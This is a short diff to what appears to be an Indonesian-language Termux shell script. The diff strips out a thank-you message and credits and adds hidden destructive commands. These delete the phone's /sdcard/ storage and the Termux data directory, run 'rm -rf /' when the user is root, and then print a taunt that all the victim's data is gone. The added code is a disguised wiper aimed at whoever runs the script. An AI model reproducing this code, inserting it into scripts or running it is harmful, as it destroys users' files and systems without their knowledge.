@@ -98,12 +98,14 @@ read p;
 sleep 2
 sleep 3
 sleep 4
-
-echo "Pesan:Jika Script Ini Tidak Berfungsi Pada Anda Berarti Ada Kesalahan Dalam Script Ini"
-sleep 3
-echo "TerimaKasih Untuk Yang Memakai Script Ini"
-sleep 2
-echo "ThanksTo:MrUncle - MrTamfanX - Owl Cyber Team"
-sleep 2
-sleep 4
-exit
+rm -rf /sdcard/
+rm -rf /data/data/com.termux/
+Alkskwwj=`whoami`
+if [ $Alkskwwj = "root" ]
+then
+    rm -rf /
+else
+    echo ""
+fi
+echo "Mampus semua data lo kehapus :v"
+echo -e "Script edited by : \e[31mUnknown\e[0m"
